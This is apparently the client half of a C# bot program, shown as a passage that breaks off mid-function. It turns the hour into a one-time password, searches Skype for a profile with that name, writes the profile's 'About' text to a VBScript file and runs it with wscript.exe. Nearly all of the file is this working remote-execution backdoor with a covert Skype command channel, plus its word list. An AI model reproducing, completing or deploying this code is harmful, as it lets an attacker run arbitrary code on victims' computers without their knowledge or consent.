﻿//CLIENT PART
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Schema;
using System.Security.Cryptography;
using SKYPE4COMLib;
using System.Timers;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace sadan
{
    public partial class Form1 : Form
    {
        public static SKYPE4COMLib.Skype oSkype = new SKYPE4COMLib.Skype();
        public XmlDocument gdoc = new XmlDocument();
        public Stack oPasswd = new Stack();
        public static string seed = "t3t1nh4";
        private static byte[] bs = null;
        public static Hashtable OTPTable = new Hashtable();
        private static System.Timers.Timer timer;
        private static Thread MyThread;
        //private static string cmd_to_exec;


        //Dictionary used to build a english readable OTP
        public static string[] words = {        
        "A",     "ABE",   "ACE",   "ACT",   "AD",    "ADA",   "ADD",
"AGO",   "AID",   "AIM",   "AIR",   "ALL",   "ALP",   "AM",    "AMY",
"AN",    "ANA",   "AND",   "ANN",   "ANT",   "ANY",   "APE",   "APS",
"APT",   "ARC",   "ARE",   "ARK",   "ARM",   "ART",   "AS",    "ASH",
"ASK",   "AT",    "ATE",   "AUG",   "AUK",   "AVE",   "AWE",   "AWK",
"AWL",   "AWN",   "AX",    "AYE",   "BAD",   "BAG",   "BAH",   "BAM",
"BAN",   "BAR",   "BAT",   "BAY",   "BE",    "BED",   "BEE",   "BEG",
"BEN",   "BET",   "BEY",   "BIB",   "BID",   "BIG",   "BIN",   "BIT",
"BOB",   "BOG",   "BON",   "BOO",   "BOP",   "BOW",   "BOY",   "BUB",
"BUD",   "BUG",   "BUM",   "BUN",   "BUS",   "BUT",   "BUY",   "BY",
"BYE",   "CAB",   "CAL",   "CAM",   "CAN",   "CAP",   "CAR",   "CAT",
"CAW",   "COD",   "COG",   "COL",   "CON",   "COO",   "COP",   "COT",
"COW",   "COY",   "CRY",   "CUB",   "CUE",   "CUP",   "CUR",   "CUT",
"DAB",   "DAD",   "DAM",   "DAN",   "DAR",   "DAY",   "DEE",   "DEL",
"DEN",   "DES",   "DEW",   "DID",   "DIE",   "DIG",   "DIN",   "DIP",
"DO",    "DOE",   "DOG",   "DON",   "DOT",   "DOW",   "DRY",   "DUB",
"DUD",   "DUE",   "DUG",   "DUN",   "EAR",   "EAT",   "ED",    "EEL",
"EGG",   "EGO",   "ELI",   "ELK",   "ELM",   "ELY",   "EM",    "END",
"EST",   "ETC",   "EVA",   "EVE",   "EWE",   "EYE",   "FAD",   "FAN",
"FAR",   "FAT",   "FAY",   "FED",   "FEE",   "FEW",   "FIB",   "FIG",
"FIN",   "FIR",   "FIT",   "FLO",   "FLY",   "FOE",   "FOG",   "FOR",
"FRY",   "FUM",   "FUN",   "FUR",   "GAB",   "GAD",   "GAG",   "GAL",
"GAM",   "GAP",   "GAS",   "GAY",   "GEE",   "GEL",   "GEM",   "GET",
"GIG",   "GIL",   "GIN",   "GO",    "GOT",   "GUM",   "GUN",   "GUS",
"GUT",   "GUY",   "GYM",   "GYP",   "HA",    "HAD",   "HAL",   "HAM",
"HAN",   "HAP",   "HAS",   "HAT",   "HAW",   "HAY",   "HE",    "HEM",
"HEN",   "HER",   "HEW",   "HEY",   "HI",    "HID",   "HIM",   "HIP",
"HIS",   "HIT",   "HO",    "HOB",   "HOC",   "HOE",   "HOG",   "HOP",
"HOT",   "HOW",   "HUB",   "HUE",   "HUG",   "HUH",   "HUM",   "HUT",
"I",     "ICY",   "IDA",   "IF",    "IKE",   "ILL",   "INK",   "INN",
"IO",    "ION",   "IQ",    "IRA",   "IRE",   "IRK",   "IS",    "IT",
"ITS",   "IVY",   "JAB",   "JAG",   "JAM",   "JAN",   "JAR",   "JAW",
"JAY",   "JET",   "JIG",   "JIM",   "JO",    "JOB",   "JOE",   "JOG",
"JOT",   "JOY",   "JUG",   "JUT",   "KAY",   "KEG",   "KEN",   "KEY",
"KID",   "KIM",   "KIN",   "KIT",   "LA",    "LAB",   "LAC",   "LAD",
"LAG",   "LAM",   "LAP",   "LAW",   "LAY",   "LEA",   "LED",   "LEE",
"LEG",   "LEN",   "LEO",   "LET",   "LEW",   "LID",   "LIE",   "LIN",
"LIP",   "LIT",   "LO",    "LOB",   "LOG",   "LOP",   "LOS",   "LOT",
"LOU",   "LOW",   "LOY",   "LUG",   "LYE",   "MA",    "MAC",   "MAD",
"MAE",   "MAN",   "MAO",   "MAP",   "MAT",   "MAW",   "MAY",   "ME",
"MEG",   "MEL",   "MEN",   "MET",   "MEW",   "MID",   "MIN",   "MIT",
"MOB",   "MOD",   "MOE",   "MOO",   "MOP",   "MOS",   "MOT",   "MOW",
"MUD",   "MUG",   "MUM",   "MY",    "NAB",   "NAG",   "NAN",   "NAP",
"NAT",   "NAY",   "NE",    "NED",   "NEE",   "NET",   "NEW",   "NIB",
"NIL",   "NIP",   "NIT",   "NO",    "NOB",   "NOD",   "NON",   "NOR",
"NOT",   "NOV",   "NOW",   "NU",    "NUN",   "NUT",   "O",     "OAF",
"OAK",   "OAR",   "OAT",   "ODD",   "ODE",   "OF",    "OFF",   "OFT",
"OH",    "OIL",   "OK",    "OLD",   "ON",    "ONE",   "OR",    "ORB",
"ORE",   "ORR",   "OS",    "OTT",   "OUR",   "OUT",   "OVA",   "OW",
"OWE",   "OWL",   "OWN",   "OX",    "PA",    "PAD",   "PAL",   "PAM",
"PAN",   "PAP",   "PAR",   "PAT",   "PAW",   "PAY",   "PEA",   "PEG",
"PEN",   "PEP",   "PER",   "PET",   "PEW",   "PHI",   "PI",    "PIE",
"PIN",   "PIT",   "PLY",   "PO",    "POD",   "POE",   "POP",   "POT",
"POW",   "PRO",   "PRY",   "PUB",   "PUG",   "PUN",   "PUP",   "PUT",
"QUO",   "RAG",   "RAM",   "RAN",   "RAP",   "RAT",   "RAW",   "RAY",
"REB",   "RED",   "REP",   "RET",   "RIB",   "RID",   "RIG",   "RIM",
"RIO",   "RIP",   "ROB",   "ROD",   "ROE",   "RON",   "ROT",   "ROW",
"ROY",   "RUB",   "RUE",   "RUG",   "RUM",   "RUN",   "RYE",   "SAC",
"SAD",   "SAG",   "SAL",   "SAM",   "SAN",   "SAP",   "SAT",   "SAW",
"SAY",   "SEA",   "SEC",   "SEE",   "SEN",   "SET",   "SEW",   "SHE",
"SHY",   "SIN",   "SIP",   "SIR",   "SIS",   "SIT",   "SKI",   "SKY",
"SLY",   "SO",    "SOB",   "SOD",   "SON",   "SOP",   "SOW",   "SOY",
"SPA",   "SPY",   "SUB",   "SUD",   "SUE",   "SUM",   "SUN",   "SUP",
"TAB",   "TAD",   "TAG",   "TAN",   "TAP",   "TAR",   "TEA",   "TED",
"TEE",   "TEN",   "THE",   "THY",   "TIC",   "TIE",   "TIM",   "TIN",
"TIP",   "TO",    "TOE",   "TOG",   "TOM",   "TON",   "TOO",   "TOP",
"TOW",   "TOY",   "TRY",   "TUB",   "TUG",   "TUM",   "TUN",   "TWO",
"UN",    "UP",    "US",    "USE",   "VAN",   "VAT",   "VET",   "VIE",
"WAD",   "WAG",   "WAR",   "WAS",   "WAY",   "WE",    "WEB",   "WED",
"WEE",   "WET",   "WHO",   "WHY",   "WIN",   "WIT",   "WOK",   "WON",
"WOO",   "WOW",   "WRY",   "WU",    "YAM",   "YAP",   "YAW",   "YE",
"YEA",   "YES",   "YET",   "YOU",   "ABED",  "ABEL",  "ABET",  "ABLE",
"ABUT",  "ACHE",  "ACID",  "ACME",  "ACRE",  "ACTA",  "ACTS",  "ADAM",
"ADDS",  "ADEN",  "AFAR",  "AFRO",  "AGEE",  "AHEM",  "AHOY",  "AIDA",
"AIDE",  "AIDS",  "AIRY",  "AJAR",  "AKIN",  "ALAN",  "ALEC",  "ALGA",
"ALIA",  "ALLY",  "ALMA",  "ALOE",  "ALSO",  "ALTO",  "ALUM",  "ALVA",
"AMEN",  "AMES",  "AMID",  "AMMO",  "AMOK",  "AMOS",  "AMRA",  "ANDY",
"ANEW",  "ANNA",  "ANNE",  "ANTE",  "ANTI",  "AQUA",  "ARAB",  "ARCH",
"AREA",  "ARGO",  "ARID",  "ARMY",  "ARTS",  "ARTY",  "ASIA",  "ASKS",
"ATOM",  "AUNT",  "AURA",  "AUTO",  "AVER",  "AVID",  "AVIS",  "AVON",
"AVOW",  "AWAY",  "AWRY",  "BABE",  "BABY",  "BACH",  "BACK",  "BADE",
"BAIL",  "BAIT",  "BAKE",  "BALD",  "BALE",  "BALI",  "BALK",  "BALL",
"BALM",  "BAND",  "BANE",  "BANG",  "BANK",  "BARB",  "BARD",  "BARE",
"BARK",  "BARN",  "BARR",  "BASE",  "BASH",  "BASK",  "BASS",  "BATE",
"BATH",  "BAWD",  "BAWL",  "BEAD",  "BEAK",  "BEAM",  "BEAN",  "BEAR",
"BEAT",  "BEAU",  "BECK",  "BEEF",  "BEEN",  "BEER",  "BEET",  "BELA",
"BELL",  "BELT",  "BEND",  "BENT",  "BERG",  "BERN",  "BERT",  "BESS",
"BEST",  "BETA",  "BETH",  "BHOY",  "BIAS",  "BIDE",  "BIEN",  "BILE",
"BILK",  "BILL",  "BIND",  "BING",  "BIRD",  "BITE",  "BITS",  "BLAB",
"BLAT",  "BLED",  "BLEW",  "BLOB",  "BLOC",  "BLOT",  "BLOW",  "BLUE",
"BLUM",  "BLUR",  "BOAR",  "BOAT",  "BOCA",  "BOCK",  "BODE",  "BODY",
"BOGY",  "BOHR",  "BOIL",  "BOLD",  "BOLO",  "BOLT",  "BOMB",  "BONA",
"BOND",  "BONE",  "BONG",  "BONN",  "BONY",  "BOOK",  "BOOM",  "BOON",
"BOOT",  "BORE",  "BORG",  "BORN",  "BOSE",  "BOSS",  "BOTH",  "BOUT",
"BOWL",  "BOYD",  "BRAD",  "BRAE",  "BRAG",  "BRAN",  "BRAY",  "BRED",
"BREW",  "BRIG",  "BRIM",  "BROW",  "BUCK",  "BUDD",  "BUFF",  "BULB",
"BULK",  "BULL",  "BUNK",  "BUNT",  "BUOY",  "BURG",  "BURL",  "BURN",
"BURR",  "BURT",  "BURY",  "BUSH",  "BUSS",  "BUST",  "BUSY",  "BYTE",
"CADY",  "CAFE",  "CAGE",  "CAIN",  "CAKE",  "CALF",  "CALL",  "CALM",
"CAME",  "CANE",  "CANT",  "CARD",  "CARE",  "CARL",  "CARR",  "CART",
"CASE",  "CASH",  "CASK",  "CAST",  "CAVE",  "CEIL",  "CELL",  "CENT",
"CERN",  "CHAD",  "CHAR",  "CHAT",  "CHAW",  "CHEF",  "CHEN",  "CHEW",
"CHIC",  "CHIN",  "CHOU",  "CHOW",  "CHUB",  "CHUG",  "CHUM",  "CITE",
"CITY",  "CLAD",  "CLAM",  "CLAN",  "CLAW",  "CLAY",  "CLOD",  "CLOG",
"CLOT",  "CLUB",  "CLUE",  "COAL",  "COAT",  "COCA",  "COCK",  "COCO",
"CODA",  "CODE",  "CODY",  "COED",  "COIL",  "COIN",  "COKE",  "COLA",
"COLD",  "COLT",  "COMA",  "COMB",  "COME",  "COOK",  "COOL",  "COON",
"COOT",  "CORD",  "CORE",  "CORK",  "CORN",  "COST",  "COVE",  "COWL",
"CRAB",  "CRAG",  "CRAM",  "CRAY",  "CREW",  "CRIB",  "CROW",  "CRUD",
"CUBA",  "CUBE",  "CUFF",  "CULL",  "CULT",  "CUNY",  "CURB",  "CURD",
"CURE",  "CURL",  "CURT",  "CUTS",  "DADE",  "DALE",  "DAME",  "DANA",
"DANE",  "DANG",  "DANK",  "DARE",  "DARK",  "DARN",  "DART",  "DASH",
"DATA",  "DATE",  "DAVE",  "DAVY",  "DAWN",  "DAYS",  "DEAD",  "DEAF",
"DEAL",  "DEAN",  "DEAR",  "DEBT",  "DECK",  "DEED",  "DEEM",  "DEER",
"DEFT",  "DEFY",  "DELL",  "DENT",  "DENY",  "DESK",  "DIAL",  "DICE",
"DIED",  "DIET",  "DIME",  "DINE",  "DING",  "DINT",  "DIRE",  "DIRT",
"DISC",  "DISH",  "DISK",  "DIVE",  "DOCK",  "DOES",  "DOLE",  "DOLL",
"DOLT",  "DOME",  "DONE",  "DOOM",  "DOOR",  "DORA",  "DOSE",  "DOTE",
"DOUG",  "DOUR",  "DOVE",  "DOWN",  "DRAB",  "DRAG",  "DRAM",  "DRAW",
"DREW",  "DRUB",  "DRUG",  "DRUM",  "DUAL",  "DUCK",  "DUCT",  "DUEL",
"DUET",  "DUKE",  "DULL",  "DUMB",  "DUNE",  "DUNK",  "DUSK",  "DUST",
"DUTY",  "EACH",  "EARL",  "EARN",  "EASE",  "EAST",  "EASY",  "EBEN",
"ECHO",  "EDDY",  "EDEN",  "EDGE",  "EDGY",  "EDIT",  "EDNA",  "EGAN",
"ELAN",  "ELBA",  "ELLA",  "ELSE",  "EMIL",  "EMIT",  "EMMA",  "ENDS",
"ERIC",  "EROS",  "EVEN",  "EVER",  "EVIL",  "EYED",  "FACE",  "FACT",
"FADE",  "FAIL",  "FAIN",  "FAIR",  "FAKE",  "FALL",  "FAME",  "FANG",
"FARM",  "FAST",  "FATE",  "FAWN",  "FEAR",  "FEAT",  "FEED",  "FEEL",
"FEET",  "FELL",  "FELT",  "FEND",  "FERN",  "FEST",  "FEUD",  "FIEF",
"FIGS",  "FILE",  "FILL",  "FILM",  "FIND",  "FINE",  "FINK",  "FIRE",
"FIRM",  "FISH",  "FISK",  "FIST",  "FITS",  "FIVE",  "FLAG",  "FLAK",
"FLAM",  "FLAT",  "FLAW",  "FLEA",  "FLED",  "FLEW",  "FLIT",  "FLOC",
"FLOG",  "FLOW",  "FLUB",  "FLUE",  "FOAL",  "FOAM",  "FOGY",  "FOIL",
"FOLD",  "FOLK",  "FOND",  "FONT",  "FOOD",  "FOOL",  "FOOT",  "FORD",
"FORE",  "FORK",  "FORM",  "FORT",  "FOSS",  "FOUL",  "FOUR",  "FOWL",
"FRAU",  "FRAY",  "FRED",  "FREE",  "FRET",  "FREY",  "FROG",  "FROM",
"FUEL",  "FULL",  "FUME",  "FUND",  "FUNK",  "FURY",  "FUSE",  "FUSS",
"GAFF",  "GAGE",  "GAIL",  "GAIN",  "GAIT",  "GALA",  "GALE",  "GALL",
"GALT",  "GAME",  "GANG",  "GARB",  "GARY",  "GASH",  "GATE",  "GAUL",
"GAUR",  "GAVE",  "GAWK",  "GEAR",  "GELD",  "GENE",  "GENT",  "GERM",
"GETS",  "GIBE",  "GIFT",  "GILD",  "GILL",  "GILT",  "GINA",  "GIRD",
"GIRL",  "GIST",  "GIVE",  "GLAD",  "GLEE",  "GLEN",  "GLIB",  "GLOB",
"GLOM",  "GLOW",  "GLUE",  "GLUM",  "GLUT",  "GOAD",  "GOAL",  "GOAT",
"GOER",  "GOES",  "GOLD",  "GOLF",  "GONE",  "GONG",  "GOOD",  "GOOF",
"GORE",  "GORY",  "GOSH",  "GOUT",  "GOWN",  "GRAB",  "GRAD",  "GRAY",
"GREG",  "GREW",  "GREY",  "GRID",  "GRIM",  "GRIN",  "GRIT",  "GROW",
"GRUB",  "GULF",  "GULL",  "GUNK",  "GURU",  "GUSH",  "GUST",  "GWEN",
"GWYN",  "HAAG",  "HAAS",  "HACK",  "HAIL",  "HAIR",  "HALE",  "HALF",
"HALL",  "HALO",  "HALT",  "HAND",  "HANG",  "HANK",  "HANS",  "HARD",
"HARK",  "HARM",  "HART",  "HASH",  "HAST",  "HATE",  "HATH",  "HAUL",
"HAVE",  "HAWK",  "HAYS",  "HEAD",  "HEAL",  "HEAR",  "HEAT",  "HEBE",
"HECK",  "HEED",  "HEEL",  "HEFT",  "HELD",  "HELL",  "HELM",  "HERB",
"HERD",  "HERE",  "HERO",  "HERS",  "HESS",  "HEWN",  "HICK",  "HIDE",
"HIGH",  "HIKE",  "HILL",  "HILT",  "HIND",  "HINT",  "HIRE",  "HISS",
"HIVE",  "HOBO",  "HOCK",  "HOFF",  "HOLD",  "HOLE",  "HOLM",  "HOLT",
"HOME",  "HONE",  "HONK",  "HOOD",  "HOOF",  "HOOK",  "HOOT",  "HORN",
"HOSE",  "HOST",  "HOUR",  "HOVE",  "HOWE",  "HOWL",  "HOYT",  "HUCK",
"HUED",  "HUFF",  "HUGE",  "HUGH",  "HUGO",  "HULK",  "HULL",  "HUNK",
"HUNT",  "HURD",  "HURL",  "HURT",  "HUSH",  "HYDE",  "HYMN",  "IBIS",
"ICON",  "IDEA",  "IDLE",  "IFFY",  "INCA",  "INCH",  "INTO",  "IONS",
"IOTA",  "IOWA",  "IRIS",  "IRMA",  "IRON",  "ISLE",  "ITCH",  "ITEM",
"IVAN",  "JACK",  "JADE",  "JAIL",  "JAKE",  "JANE",  "JAVA",  "JEAN",
"JEFF",  "JERK",  "JESS",  "JEST",  "JIBE",  "JILL",  "JILT",  "JIVE",
"JOAN",  "JOBS",  "JOCK",  "JOEL",  "JOEY",  "JOHN",  "JOIN",  "JOKE",
"JOLT",  "JOVE",  "JUDD",  "JUDE",  "JUDO",  "JUDY",  "JUJU",  "JUKE",
"JULY",  "JUNE",  "JUNK",  "JUNO",  "JURY",  "JUST",  "JUTE",  "KAHN",
"KALE",  "KANE",  "KANT",  "KARL",  "KATE",  "KEEL",  "KEEN",  "KENO",
"KENT",  "KERN",  "KERR",  "KEYS",  "KICK",  "KILL",  "KIND",  "KING",
"KIRK",  "KISS",  "KITE",  "KLAN",  "KNEE",  "KNEW",  "KNIT",  "KNOB",
"KNOT",  "KNOW",  "KOCH",  "KONG",  "KUDO",  "KURD",  "KURT",  "KYLE",
"LACE",  "LACK",  "LACY",  "LADY",  "LAID",  "LAIN",  "LAIR",  "LAKE",
"LAMB",  "LAME",  "LAND",  "LANE",  "LANG",  "LARD",  "LARK",  "LASS",
"LAST",  "LATE",  "LAUD",  "LAVA",  "LAWN",  "LAWS",  "LAYS",  "LEAD",
"LEAF",  "LEAK",  "LEAN",  "LEAR",  "LEEK",  "LEER",  "LEFT",  "LEND",
"LENS",  "LENT",  "LEON",  "LESK",  "LESS",  "LEST",  "LETS",  "LIAR",
"LICE",  "LICK",  "LIED",  "LIEN",  "LIES",  "LIEU",  "LIFE",  "LIFT",
"LIKE",  "LILA",  "LILT",  "LILY",  "LIMA",  "LIMB",  "LIME",  "LIND",
"LINE",  "LINK",  "LINT",  "LION",  "LISA",  "LIST",  "LIVE",  "LOAD",
"LOAF",  "LOAM",  "LOAN",  "LOCK",  "LOFT",  "LOGE",  "LOIS",  "LOLA",
"LONE",  "LONG",  "LOOK",  "LOON",  "LOOT",  "LORD",  "LORE",  "LOSE",
"LOSS",  "LOST",  "LOUD",  "LOVE",  "LOWE",  "LUCK",  "LUCY",  "LUGE",
"LUKE",  "LULU",  "LUND",  "LUNG",  "LURA",  "LURE",  "LURK",  "LUSH",
"LUST",  "LYLE",  "LYNN",  "LYON",  "LYRA",  "MACE",  "MADE",  "MAGI",
"MAID",  "MAIL",  "MAIN",  "MAKE",  "MALE",  "MALI",  "MALL",  "MALT",
"MANA",  "MANN",  "MANY",  "MARC",  "MARE",  "MARK",  "MARS",  "MART",
"MARY",  "MASH",  "MASK",  "MASS",  "MAST",  "MATE",  "MATH",  "MAUL",
"MAYO",  "MEAD",  "MEAL",  "MEAN",  "MEAT",  "MEEK",  "MEET",  "MELD",
"MELT",  "MEMO",  "MEND",  "MENU",  "MERT",  "MESH",  "MESS",  "MICE",
"MIKE",  "MILD",  "MILE",  "MILK",  "MILL",  "MILT",  "MIMI",  "MIND",
"MINE",  "MINI",  "MINK",  "MINT",  "MIRE",  "MISS",  "MIST",  "MITE",
"MITT",  "MOAN",  "MOAT",  "MOCK",  "MODE",  "MOLD",  "MOLE",  "MOLL",
"MOLT",  "MONA",  "MONK",  "MONT",  "MOOD",  "MOON",  "MOOR",  "MOOT",
"MORE",  "MORN",  "MORT",  "MOSS",  "MOST",  "MOTH",  "MOVE",  "MUCH",
"MUCK",  "MUDD",  "MUFF",  "MULE",  "MULL",  "MURK",  "MUSH",  "MUST",
"MUTE",  "MUTT",  "MYRA",  "MYTH",  "NAGY",  "NAIL",  "NAIR",  "NAME",
"NARY",  "NASH",  "NAVE",  "NAVY",  "NEAL",  "NEAR",  "NEAT",  "NECK",
"NEED",  "NEIL",  "NELL",  "NEON",  "NERO",  "NESS",  "NEST",  "NEWS",
"NEWT",  "NIBS",  "NICE",  "NICK",  "NILE",  "NINA",  "NINE",  "NOAH",
"NODE",  "NOEL",  "NOLL",  "NONE",  "NOOK",  "NOON",  "NORM",  "NOSE",
"NOTE",  "NOUN",  "NOVA",  "NUDE",  "NULL",  "NUMB",  "OATH",  "OBEY",
"OBOE",  "ODIN",  "OHIO",  "OILY",  "OINT",  "OKAY",  "OLAF",  "OLDY",
"OLGA",  "OLIN",  "OMAN",  "OMEN",  "OMIT",  "ONCE",  "ONES",  "ONLY",
"ONTO",  "ONUS",  "ORAL",  "ORGY",  "OSLO",  "OTIS",  "OTTO",  "OUCH",
"OUST",  "OUTS",  "OVAL",  "OVEN",  "OVER",  "OWLY",  "OWNS",  "QUAD",
"QUIT",  "QUOD",  "RACE",  "RACK",  "RACY",  "RAFT",  "RAGE",  "RAID",
"RAIL",  "RAIN",  "RAKE",  "RANK",  "RANT",  "RARE",  "RASH",  "RATE",
"RAVE",  "RAYS",  "READ",  "REAL",  "REAM",  "REAR",  "RECK",  "REED",
"REEF",  "REEK",  "REEL",  "REID",  "REIN",  "RENA",  "REND",  "RENT",
"REST",  "RICE",  "RICH",  "RICK",  "RIDE",  "RIFT",  "RILL",  "RIME",
"RING",  "RINK",  "RISE",  "RISK",  "RITE",  "ROAD",  "ROAM",  "ROAR",
"ROBE",  "ROCK",  "RODE",  "ROIL",  "ROLL",  "ROME",  "ROOD",  "ROOF",
"ROOK",  "ROOM",  "ROOT",  "ROSA",  "ROSE",  "ROSS",  "ROSY",  "ROTH",
"ROUT",  "ROVE",  "ROWE",  "ROWS",  "RUBE",  "RUBY",  "RUDE",  "RUDY",
"RUIN",  "RULE",  "RUNG",  "RUNS",  "RUNT",  "RUSE",  "RUSH",  "RUSK",
"RUSS",  "RUST",  "RUTH",  "SACK",  "SAFE",  "SAGE",  "SAID",  "SAIL",
"SALE",  "SALK",  "SALT",  "SAME",  "SAND",  "SANE",  "SANG",  "SANK",
"SARA",  "SAUL",  "SAVE",  "SAYS",  "SCAN",  "SCAR",  "SCAT",  "SCOT",
"SEAL",  "SEAM",  "SEAR",  "SEAT",  "SEED",  "SEEK",  "SEEM",  "SEEN",
"SEES",  "SELF",  "SELL",  "SEND",  "SENT",  "SETS",  "SEWN",  "SHAG",
"SHAM",  "SHAW",  "SHAY",  "SHED",  "SHIM",  "SHIN",  "SHOD",  "SHOE",
"SHOT",  "SHOW",  "SHUN",  "SHUT",  "SICK",  "SIDE",  "SIFT",  "SIGH",
"SIGN",  "SILK",  "SILL",  "SILO",  "SILT",  "SINE",  "SING",  "SINK",
"SIRE",  "SITE",  "SITS",  "SITU",  "SKAT",  "SKEW",  "SKID",  "SKIM",
"SKIN",  "SKIT",  "SLAB",  "SLAM",  "SLAT",  "SLAY",  "SLED",  "SLEW",
"SLID",  "SLIM",  "SLIT",  "SLOB",  "SLOG",  "SLOT",  "SLOW",  "SLUG",
"SLUM",  "SLUR",  "SMOG",  "SMUG",  "SNAG",  "SNOB",  "SNOW",  "SNUB",
"SNUG",  "SOAK",  "SOAR",  "SOCK",  "SODA",  "SOFA",  "SOFT",  "SOIL",
"SOLD",  "SOME",  "SONG",  "SOON",  "SOOT",  "SORE",  "SORT",  "SOUL",
"SOUR",  "SOWN",  "STAB",  "STAG",  "STAN",  "STAR",  "STAY",  "STEM",
"STEW",  "STIR",  "STOW",  "STUB",  "STUN",  "SUCH",  "SUDS",  "SUIT",
"SULK",  "SUMS",  "SUNG",  "SUNK",  "SURE",  "SURF",  "SWAB",  "SWAG",
"SWAM",  "SWAN",  "SWAT",  "SWAY",  "SWIM",  "SWUM",  "TACK",  "TACT",
"TAIL",  "TAKE",  "TALE",  "TALK",  "TALL",  "TANK",  "TASK",  "TATE",
"TAUT",  "TEAL",  "TEAM",  "TEAR",  "TECH",  "TEEM",  "TEEN",  "TEET",
"TELL",  "TEND",  "TENT",  "TERM",  "TERN",  "TESS",  "TEST",  "THAN",
"THAT",  "THEE",  "THEM",  "THEN",  "THEY",  "THIN",  "THIS",  "THUD",
"THUG",  "TICK",  "TIDE",  "TIDY",  "TIED",  "TIER",  "TILE",  "TILL",
"TILT",  "TIME",  "TINA",  "TINE",  "TINT",  "TINY",  "TIRE",  "TOAD",
"TOGO",  "TOIL",  "TOLD",  "TOLL",  "TONE",  "TONG",  "TONY",  "TOOK",
"TOOL",  "TOOT",  "TORE",  "TORN",  "TOTE",  "TOUR",  "TOUT",  "TOWN",
"TRAG",  "TRAM",  "TRAY",  "TREE",  "TREK",  "TRIG",  "TRIM",  "TRIO",
"TROD",  "TROT",  "TROY",  "TRUE",  "TUBA",  "TUBE",  "TUCK",  "TUFT",
"TUNA",  "TUNE",  "TUNG",  "TURF",  "TURN",  "TUSK",  "TWIG",  "TWIN",
"TWIT",  "ULAN",  "UNIT",  "URGE",  "USED",  "USER",  "USES",  "UTAH",
"VAIL",  "VAIN",  "VALE",  "VARY",  "VASE",  "VAST",  "VEAL",  "VEDA",
"VEIL",  "VEIN",  "VEND",  "VENT",  "VERB",  "VERY",  "VETO",  "VICE",
"VIEW",  "VINE",  "VISE",  "VOID",  "VOLT",  "VOTE",  "WACK",  "WADE",
"WAGE",  "WAIL",  "WAIT",  "WAKE",  "WALE",  "WALK",  "WALL",  "WALT",
"WAND",  "WANE",  "WANG",  "WANT",  "WARD",  "WARM",  "WARN",  "WART",
"WASH",  "WAST",  "WATS",  "WATT",  "WAVE",  "WAVY",  "WAYS",  "WEAK",
"WEAL",  "WEAN",  "WEAR",  "WEED",  "WEEK",  "WEIR",  "WELD",  "WELL",
"WELT",  "WENT",  "WERE",  "WERT",  "WEST",  "WHAM",  "WHAT",  "WHEE",
"WHEN",  "WHET",  "WHOA",  "WHOM",  "WICK",  "WIFE",  "WILD",  "WILL",
"WIND",  "WINE",  "WING",  "WINK",  "WINO",  "WIRE",  "WISE",  "WISH",
"WITH",  "WOLF",  "WONT",  "WOOD", "WOOL", "WORD", "WORE", "WORK", "WORM", "WORN",
"WOVE", "WRIT", "WYNN", "YALE", "YANG", "YANK", "YARD", "YARN","YAWL", "YAWN", "YEAH", "YEAR", "YELL", "YOGA", "YOKE" };

        //Our Scheduler to get hourly a new OTP
        static void StartScheduler()
        {
            timer = new System.Timers.Timer();
            timer.Interval = (1000 * 60) * 2;
            timer.Elapsed += new ElapsedEventHandler(ServiceTimer_Tick);
            timer.Enabled = true;
            GC.KeepAlive(timer);
        }
        private static void ServiceTimer_Tick(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                DateTime dt = DateTime.Now;
                if (dt.Hour == 0)
                {
                    GenOneTimePasswordStack(24);
                    SearchNewFullName();
                }
                else
                {
                    SearchNewFullName();
                }
            }catch
            {
            }
        }
        static string ParseCommand(string url)
        {
            //url.
            return null;
        }
        static void SearchNewFullName()
        {
            DateTime dt = DateTime.Now;
            string sSearch = OTPTable[dt.Hour].ToString();
            UserCollection uCol = oSkype.SearchForUsers(sSearch);

            try
            {
                foreach (User u in uCol)
                {
                    string uName = u.FullName;
                    //string uInfo = u.Homepage;
                    //Here i will receive a XML.. but for now, just a wscript.echo is enought
                    string cmd_to_exec = u.About;
                    ExecCMD(cmd_to_exec);
                    //MessageBox.Show(uName + " " + uInfo);
                }
            }
            catch (Exception Ex)
            {
            }
        }
        //TODO
        //IT will run in another thread
        //I will receive a XML, i must parse the commands and then put it in a temp file
        //Then i will try to execute it.
        static bool ExecCMD(string cmd_to_exec)
        {
            StreamWriter SW;
            SW = File.CreateText("c:\\sadan.vbs");
            SW.WriteLine(cmd_to_exec);
            //SW.WriteLine("This is second line");
            SW.Close();
            Process PScript = new Process();
            PScript.StartInfo.FileName = "wscript.exe";
            PScript.StartInfo.Arguments = "c:\\sadan.vbs";
            PScript.EnableRaisingEvents = true;
            PScript.Exited += new EventHandler(processExited);

            try
            {
                PScript.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return true;
            
        }
        private static void processExited(object sender, System.EventArgs e)
        {
            File.Delete("C:\\sadan.vbs");
        }
        //Function to find a value in the words (english dictionary) array
        static string btoe(int index)
        {
            if (index < words.Length)
            {
                return words[index];
            }
            else
            {
                return "bogus";
            }
        }
        //Let's Convert byteToLong
        static long tolong(byte[] bs)
        {
            long wi;
            int i;

            wi = 0;
            for (i = 0; i < 8; i++)
            {
                wi <<= 8;
                wi |= (bs[i] & 0xff);
            }
            return wi;

        }
        //Lets Convert a hash into a english readable thing
        static string GetString(byte[] bs)
        {
            long wi, tmplong;
            string tmpstr;
            int i;
            byte parity;

            wi = tolong(bs);
            tmplong = wi;
            tmpstr = "";
            parity = 0;

            for (i = 0; i < 64; i += 2)
            {
                parity += Convert.ToByte(tmplong & 0x3);
                tmplong >>= 2;
            }
            for (i = 4; i >= 0; i--)
            {
                tmpstr += btoe((int)
                    ((wi >> (i * 11 + 9)) & 0x7ff)) + " ";
            }
            tmpstr += btoe((int)((wi << 2) & 0x7fc) | (parity & 0x03));
            return tmpstr;
        }

        public Form1()
        {
            
            InitializeComponent();
            
        }

        private static bool GenOneTimePasswordStack(int elements)
        {
            MD5CryptoServiceProvider md5Hash = new MD5CryptoServiceProvider();
            int iCount = 0;

            //The S/KEY stack was generated before. So let's clean and generate a brand new stack
            if (OTPTable.Count > 0)
            {
                OTPTable.Clear();
            }
            try
            {

                while (iCount < elements)
                {

                    string appendable = GetTime(Convert.ToDouble(iCount));

                    if (appendable != null)
                    {
                        byte[] bs = System.Text.Encoding.UTF8.GetBytes(seed + appendable);
